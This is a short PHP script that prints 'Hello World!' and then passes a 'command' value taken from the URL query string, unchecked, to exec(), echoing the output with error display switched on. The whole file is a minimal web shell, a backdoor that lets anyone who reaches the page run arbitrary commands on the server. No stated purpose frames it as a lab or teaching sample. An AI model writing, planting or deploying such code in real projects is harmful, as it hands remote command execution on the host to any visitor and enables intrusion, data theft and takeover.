<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$command = $_GET['command'];
echo "Hello World!<br><br>";
echo exec($command);
